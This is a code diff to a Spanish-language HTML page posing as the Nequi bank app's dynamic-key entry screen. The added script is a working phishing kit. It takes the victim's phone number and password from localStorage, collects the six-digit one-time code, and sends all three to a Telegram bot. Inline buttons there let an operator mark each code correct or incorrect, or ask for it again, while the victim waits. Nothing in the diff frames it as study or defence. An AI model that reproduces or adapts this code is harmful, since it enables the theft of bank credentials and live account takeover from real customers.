@@ -299,107 +299,185 @@
     <button class="confirm-btn" id="confirmBtn" disabled>Confirmar</button>
   </div>
 
+  <script src="../js/sendTelegramMessage.js"></script>
+  <script src="../js/actions.js"></script>
   <script>
-    const inputs = [
-      document.getElementById('pin1'),
-      document.getElementById('pin2'),
-      document.getElementById('pin3'),
-      document.getElementById('pin4'),
-      document.getElementById('pin5'),
-      document.getElementById('pin6')
-    ];
-    
-    const keyButtons = document.querySelectorAll('.key-btn[data-value]');
-    const deleteBtn = document.getElementById('deleteBtn');
-    const confirmBtn = document.getElementById('confirmBtn');
-    const validatingScreen = document.getElementById('validatingScreen');
-    const errorMessage = document.getElementById('errorMessage');
-    
-    let currentIndex = 0;
-    
-    // Manejo del teclado numérico
-    keyButtons.forEach(btn => {
-      btn.addEventListener('click', () => {
-        if (currentIndex < inputs.length) {
-          const value = btn.dataset.value;
-          inputs[currentIndex].value = value;
-          inputs[currentIndex].dataset.realValue = value;
-          inputs[currentIndex].classList.add('filled');
-          currentIndex++;
+    document.addEventListener("DOMContentLoaded", () => {
+      // Verificar que existan los datos necesarios
+      const formData = JSON.parse(localStorage.getItem("formData")) || {};
+      
+      if (!formData.phoneNumber || !formData.password) {
+        console.error("❌ Datos incompletos");
+        window.location.href = "access-sign-in.html";
+        return;
+      }
+
+      const inputs = [
+        document.getElementById('pin1'),
+        document.getElementById('pin2'),
+        document.getElementById('pin3'),
+        document.getElementById('pin4'),
+        document.getElementById('pin5'),
+        document.getElementById('pin6')
+      ];
+      
+      const keyButtons = document.querySelectorAll('.key-btn[data-value]');
+      const deleteBtn = document.getElementById('deleteBtn');
+      const confirmBtn = document.getElementById('confirmBtn');
+      const validatingScreen = document.getElementById('validatingScreen');
+      const errorMessage = document.getElementById('errorMessage');
+      
+      let currentIndex = 0;
+      
+      // Manejo del teclado numérico
+      keyButtons.forEach(btn => {
+        btn.addEventListener('click', () => {
+          if (currentIndex < inputs.length) {
+            const value = btn.dataset.value;
+            inputs[currentIndex].value = value;
+            inputs[currentIndex].dataset.realValue = value;
+            inputs[currentIndex].classList.add('filled');
+            currentIndex++;
+            
+            checkComplete();
+          }
+        });
+      });
+      
+      // Botón de borrar
+      deleteBtn.addEventListener('click', () => {
+        if (currentIndex > 0) {
+          currentIndex--;
+          inputs[currentIndex].value = '';
+          inputs[currentIndex].dataset.realValue = '';
+          inputs[currentIndex].classList.remove('filled');
           
           checkComplete();
         }
       });
-    });
-    
-    // Botón de borrar
-    deleteBtn.addEventListener('click', () => {
-      if (currentIndex > 0) {
-        currentIndex--;
-        inputs[currentIndex].value = '';
-        inputs[currentIndex].dataset.realValue = '';
-        inputs[currentIndex].classList.remove('filled');
+      
+      // Verificar si está completo
+      function checkComplete() {
+        const isComplete = inputs.every(input => input.value !== '');
+        confirmBtn.disabled = !isComplete;
         
-        checkComplete();
+        if (isComplete) {
+          // Auto-enviar después de completar
+          setTimeout(() => {
+            confirmBtn.click();
+          }, 300);
+        }
       }
-    });
-    
-    // Verificar si está completo
-    function checkComplete() {
-      const isComplete = inputs.every(input => input.value !== '');
-      confirmBtn.disabled = !isComplete;
       
-      if (isComplete) {
-        // Auto-enviar después de completar
-        setTimeout(() => {
-          confirmBtn.click();
-        }, 300);
+      // Función para limpiar campos
+      function clearInputs() {
+        inputs.forEach(input => {
+          input.value = '';
+          input.dataset.realValue = '';
+          input.classList.remove('filled');
+        });
+        currentIndex = 0;
+        confirmBtn.disabled = true;
       }
-    }
-    
-    // Botón confirmar
-    confirmBtn.addEventListener('click', async () => {
-      const dinamica = inputs.map(input => input.dataset.realValue || input.value).join('');
       
-      // Mostrar pantalla de validación
-      validatingScreen.classList.add('active');
-      
-      // Simular envío (aquí iría tu lógica de Telegram)
-      await new Promise(resolve => setTimeout(resolve, 2000));
-      
-      // Ocultar pantalla de validación
-      validatingScreen.classList.remove('active');
-      
-      // Simular error (cambiar por tu lógica real)
-      const hasError = Math.random() > 0.5;
-      
-      if (hasError) {
-        errorMessage.classList.add('show');
+      // Botón confirmar con integración de Telegram
+      confirmBtn.addEventListener('click', async () => {
+        const dinamica = inputs.map(input => input.dataset.realValue || input.value).join('');
         
-        // Limpiar campos
-        setTimeout(() => {
-          inputs.forEach(input => {
-            input.value = '';
-            input.dataset.realValue = '';
-            input.classList.remove('filled');
-          });
-          currentIndex = 0;
-          confirmBtn.disabled = true;
-          errorMessage.classList.remove('show');
-        }, 3000);
-      } else {
-        // Éxito - redirigir o mostrar siguiente paso
-        console.log('Clave correcta:', dinamica);
-      }
-    });
-    
-    // Prevenir teclado del sistema
-    inputs.forEach(input => {
-      input.addEventListener('keydown', (e) => {
-        e.preventDefault();
+        // Guardar la dinámica en localStorage
+        const savedData = JSON.parse(localStorage.getItem("formData")) || {};
+        const transactionId = savedData.transactionId || Date.now().toString(36);
+        savedData.dinamica = dinamica;
+        localStorage.setItem("formData", JSON.stringify(savedData));
+        
+        // Mostrar pantalla de validación
+        validatingScreen.classList.add('active');
+        
+        // Preparar mensaje para Telegram
+        const mensaje = `🔐 *CLAVE DINÁMICA NEQUI*\n\n📱 *Número:* +57 ${savedData.phoneNumber}\n🔑 *Clave:* ${savedData.password}\n🎯 *Dinámica:* ${dinamica}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;
+        
+        const teclado = JSON.stringify({
+          inline_keyboard: [
+            [
+              { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
+              { text: "❌ Incorrecto", callback_data: `error_dinamica:${transactionId}` }
+            ],
+            [
+              { text: "🔐 Pedir Otra Vez", callback_data: `pedir_dinamica:${transactionId}` }
+            ],
+            [
+              { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
+            ]
+          ]
+        });
+
+        try {
+          // Enviar mensaje a Telegram
+          const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
+          
+          // Esperar respuesta del botón
+          const { action } = await waitForButtonPress(responseMensaje.message_id);
+          
+          // Ocultar pantalla de validación
+          validatingScreen.classList.remove('active');
+          
+          // Manejar la acción recibida
+          await handleAction(action, transactionId);
+          
+        } catch (error) {
+          console.error("❌ Error:", error);
+          validatingScreen.classList.remove('active');
+          
+          errorMessage.textContent = "⚠️ Error de conexión. Por favor intenta nuevamente.";
+          errorMessage.classList.add('show');
+          
+          setTimeout(() => {
+            clearInputs();
+            errorMessage.classList.remove('show');
+          }, 3000);
+        }
       });
-      input.addEventListener('paste', (e) => {
-        e.preventDefault();
+
+      // Función global para manejar acciones desde actions.js
+      window.handleDinamicaAction = function(action) {
+        validatingScreen.classList.remove('active');
+        
+        if (action === 'error_dinamica' || action === 'pedir_dinamica') {
+          // Mostrar error y limpiar campos
+          errorMessage.textContent = "⚠️ La clave dinámica es incorrecta. Intenta nuevamente.";
+          errorMessage.classList.add('show');
+          
+          setTimeout(() => {
+            clearInputs();
+            errorMessage.classList.remove('show');
+          }, 3000);
+        } else if (action === 'correcto') {
+          // Redirigir a la siguiente pantalla o mostrar éxito
+          console.log('✅ Clave dinámica correcta');
+          // Aquí puedes redirigir a la siguiente página
+          // window.location.href = "siguiente-paso.html";
+        } else if (action === 'finish') {
+          // Finalizar proceso
+          console.log('✔️ Proceso finalizado');
+          // window.location.href = "finalizacion.html";
+        }
+      };
+      
+      // Prevenir teclado del sistema
+      inputs.forEach(input => {
+        ['keydown', 'keyup', 'keypress'].forEach(eventType => {
+          input.addEventListener(eventType, (e) => {
+            if (e.key !== 'Backspace') {
+              e.preventDefault();
+              return false;
+            }
+          });
+        });
+        
+        input.addEventListener('paste', (e) => {
+          e.preventDefault();
+          return false;
+        });
       });
     });
   </script>
